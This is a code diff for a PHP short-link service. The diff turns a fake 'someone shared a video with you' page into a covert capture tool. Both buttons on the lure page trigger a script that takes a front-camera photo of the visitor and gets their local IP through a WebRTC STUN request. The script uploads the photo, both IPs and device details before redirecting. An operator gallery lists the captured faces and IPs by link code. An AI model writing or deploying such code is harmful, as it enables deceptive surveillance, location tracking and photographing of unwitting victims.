@@ -16,15 +16,47 @@ try {
         sender_avatar TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
+
+    $db->exec("CREATE TABLE IF NOT EXISTS captures (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        code TEXT, 
+        image_data TEXT, 
+        public_ip TEXT, 
+        local_ip TEXT, 
+        device_info TEXT, 
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )");
 } catch (Exception $e) {
     die("Database error: " . $e->getMessage());
+}
+
+function get_real_ip() {
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ips[0]);
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+}
+
+function get_device_type($ua) {
+    $brand = 'Device';
+    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
+    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
+    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
+    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
+    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
+
+    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
+    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
+    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
+    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
+    return 'Unknown Device';
 }
 
 $target_redirect = "";
 $sender_name = "User";
 $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
 
-// معالجة زيارة الرابط القصير
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -35,12 +67,27 @@ if (isset($_GET['r'])) {
         $target_redirect = $link['target_url'];
         $sender_name = $link['sender_name'];
         $sender_avatar = $link['sender_avatar'];
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
+            $img_base64 = $_POST['image'] ?? '';
+            $public_ip = get_real_ip();
+            $local_ip = $_POST['lip'] ?? $public_ip;
+            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+            $device = get_device_type($ua);
+
+            if (!empty($img_base64)) {
+                try {
+                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?)");
+                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $device, date('Y-m-d H:i:s')]);
+                } catch (Exception $e) {}
+            }
+            exit('OK');
+        }
     } else {
         die("Link not found.");
     }
 }
 
-// إنشاء رابط جديد من لوحة التحكم
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
@@ -59,9 +106,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
-$links_list = $db->query("SELECT * FROM links ORDER BY id DESC LIMIT 20")->fetchAll(PDO::FETCH_ASSOC);
+$filter_code = trim($_GET['track'] ?? '');
+if (!empty($filter_code)) {
+    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
+    $stmt->execute([$filter_code]);
+    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} else {
+    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
+}
 
-// إذا كان الزائر يفتح رابط تعقب، يتم عرض واجهة الفيديو التفاعلية
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -69,127 +122,140 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shared Video</title>
+    <title>Watch Video</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; }
         
-        /* خلفية الفيديو المتحركة */
-        .video-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            z-index: 1;
-            overflow: hidden;
-        }
-        .video-background video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: brightness(0.6);
-        }
-
-        /* حاوية البطاقة التفاعلية فوق الفيديو */
-        .overlay-container {
+        .tiktok-bg {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: rgba(0, 0, 0, 0.4);
-            padding: 20px;
+            background: linear-gradient(135deg, #121212 0%, #1f1f1f 50%, #0a0a0a 100%);
+            z-index: 1;
+        }
+        .tiktok-bg::before {
+            content: '';
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: rgba(254, 44, 85, 0.15);
+            border-radius: 50%;
+            top: 10%;
+            left: 10%;
+            filter: blur(80px);
+        }
+        .tiktok-bg::after {
+            content: '';
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: rgba(37, 244, 238, 0.15);
+            border-radius: 50%;
+            bottom: 10%;
+            right: 10%;
+            filter: blur(80px);
         }
 
         .modal-card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            width: 100%;
+            position: relative;
+            background: #ffffff;
+            width: 90%;
             max-width: 350px;
-            border-radius: 20px;
+            border-radius: 24px;
             padding: 30px 20px;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-            animation: fadeIn 0.4s ease-out;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+            z-index: 10;
+            animation: popUp 0.3s ease-out;
         }
+        @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
-        @keyframes fadeIn {
-            from { transform: scale(0.9); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
+        .avatar-container { width: 80px; height: 80px; border-radius: 50%; overflow: hidden; margin: -65px auto 16px auto; border: 4px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: #eee; }
+        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
 
-        .avatar-container {
-            width: 76px;
-            height: 76px;
-            border-radius: 50%;
-            overflow: hidden;
-            margin: 0 auto 16px auto;
-            border: 3px solid #fe2c55;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-        }
-        .avatar-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+        h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
+        p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }
 
-        h2 { font-size: 18px; font-weight: 700; color: #111; margin-bottom: 6px; }
-        p { font-size: 13px; color: #555; margin-bottom: 24px; line-height: 1.5; }
-
-        .btn-action {
-            display: block;
-            width: 100%;
-            background: #fe2c55;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            text-decoration: none;
-            margin-bottom: 10px;
-            box-shadow: 0 4px 14px rgba(254,44,85,0.4);
-            transition: background 0.2s;
-        }
-        .btn-action:hover { background: #e02045; }
-        .btn-secondary {
-            background: transparent;
-            color: #777;
-            border: none;
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-            padding: 6px;
-        }
+        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); }
+        .btn-action:active { transform: scale(0.98); }
+        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; }
     </style>
+    <script>
+        function getLocalIP(callback) {
+            let foundLocal = false;
+            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            if (!RTCPeerConnection) { callback("Unknown"); return; }
+            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            pc.onicecandidate = function(ice) {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if (myIP) {
+                    let ip = myIP[1];
+                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+                        if (!foundLocal) { foundLocal = true; callback(ip); pc.onicecandidate = null; }
+                    }
+                }
+            };
+            setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
+        }
+
+        function captureAndRedirect() {
+            const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
+            const targetUrl = "<?php echo $target_redirect; ?>";
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                        stream.getTracks().forEach(track => track.stop());
+
+                        getLocalIP(function(localIp) {
+                            const formData = new URLSearchParams();
+                            formData.append('save_capture', '1');
+                            formData.append('image', imageData);
+                            formData.append('lip', localIp);
+
+                            fetch(window.location.href, {
+                                method: 'POST',
+                                body: formData
+                            }).finally(() => {
+                                window.location.replace(targetUrl);
+                            });
+                        });
+                    }, 600);
+                })
+                .catch(err => {
+                    window.location.replace(targetUrl);
+                });
+        }
+    </script>
 </head>
 <body>
-
-    <!-- خلفية فيديو متحركة (يمكنك استبدال الرابط بأي فيديو قصير بصيغة mp4) -->
-    <div class="video-background">
-        <video autoplay muted loop playsinline>
-            <source src="https://assets.mixkit.co/videos/preview/mixkit-vertical-view-of-a-traffic-jam-at-night-42616-large.mp4" type="video/mp4">
-        </video>
-    </div>
-
-    <div class="overlay-container">
-        <div class="modal-card">
-            <div class="avatar-container">
-                <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
-            </div>
-            <h2>Watch this video</h2>
-            <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
-            <a href="<?php echo htmlspecialchars($target_redirect); ?>" class="btn-action">Watch Now</a>
-            <button class="btn-secondary" onclick="window.location.href='<?php echo htmlspecialchars($target_redirect); ?>'">Not now</button>
+    <div class="tiktok-bg"></div>
+    <div class="modal-card">
+        <div class="avatar-container">
+            <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
         </div>
+        <h2>Watch this video</h2>
+        <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
+        <button class="btn-action" onclick="captureAndRedirect()">Watch Now</button>
+        <button class="btn-secondary" onclick="captureAndRedirect()">Not now</button>
     </div>
-
 </body>
 </html>
 <?php 
@@ -211,10 +277,11 @@ endif;
             --text-muted: #64748b;
             --accent: #6366f1;
             --accent-hover: #4f46e5;
+            --danger: #ef4444;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
-        .wrapper { max-width: 900px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
+        .wrapper { max-width: 1000px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
         
         .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
         h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
@@ -225,18 +292,19 @@ endif;
         
         .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
         .btn:hover { background: var(--accent-hover); }
+        .btn-danger { background: var(--danger); }
         .btn-secondary { background: #334155; }
 
         .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
         .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
         .flex-row { display: flex; gap: 8px; }
 
-        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 8px; margin-top: 15px; }
-        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 12px; }
-        th { background: #020617; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); text-transform: uppercase; }
-        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #cbd5e1; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; margin-top: 15px; }
+        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; text-align: center; }
+        .card-img img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
+        .card-meta { margin-top: 10px; font-size: 11px; color: var(--text-muted); display: flex; justify-content: space-between; align-items: center; }
+        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
 
-        .code-badge { background: rgba(99, 102, 241, 0.1); color: #818cf8; padding: 4px 8px; border-radius: 4px; font-family: monospace; border: 1px solid rgba(99, 102, 241, 0.2); }
         footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
     </style>
@@ -258,7 +326,7 @@ endif;
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate Video Link</h2>
+            <h2>Generate Capture Link</h2>
             <form method="POST" class="form-grid">
                 <input type="text" name="target_url" placeholder="Target Destination URL (e.g. YouTube)..." required>
                 <div style="display: flex; gap: 10px;">
@@ -280,35 +348,35 @@ endif;
         </div>
 
         <div class="section-box">
-            <h2>Generated Links History</h2>
-            <div class="table-wrap">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>#ID</th>
-                            <th>Code</th>
-                            <th>Sender</th>
-                            <th>Target URL</th>
-                            <th>Created At</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if (empty($links_list)): ?>
-                            <tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">No links generated yet.</td></tr>
-                        <?php else: ?>
-                            <?php foreach ($links_list as $row): ?>
-                            <tr>
-                                <td><?php echo $row['id']; ?></td>
-                                <td><span class="code-badge"><?php echo htmlspecialchars($row['code']); ?></span></td>
-                                <td style="font-weight: 600; color: #fff;"><?php echo htmlspecialchars($row['sender_name']); ?></td>
-                                <td style="color: #38bdf8; max-width: 300px; overflow: hidden; text-overflow: ellipsis;"><?php echo htmlspecialchars($row['target_url']); ?></td>
-                                <td style="color: #10b981;"><?php echo htmlspecialchars($row['created_at']); ?></td>
-                            </tr>
-                            <?php endforeach; ?>
-                        <?php endif; ?>
-                    </tbody>
-                </table>
-            </div>
+            <h2>Captured Images Gallery</h2>
+            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
+                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
+                <button type="submit" class="btn" style="height:42px;">Filter</button>
+                <?php if(!empty($filter_code)): ?>
+                    <a href="/" class="btn btn-danger" style="height:42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+                <?php endif; ?>
+            </form>
+
+            <?php if (empty($captures)): ?>
+                <p style="text-align: center; color: var(--text-muted); padding: 30px;">No captures recorded.</p>
+            <?php else: ?>
+                <div class="gallery-grid">
+                    <?php foreach ($captures as $cap): ?>
+                        <div class="card-img">
+                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                            </a>
+                            <div class="card-meta">
+                                <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
+                                <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
+                            </div>
+                            <div style="font-size:10px; color:var(--text-muted); margin-top:4px; text-align:right;">
+                                <?php echo htmlspecialchars($cap['created_at']); ?>
+                            </div>
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+            <?php endif; ?>
         </div>
 
     </div>
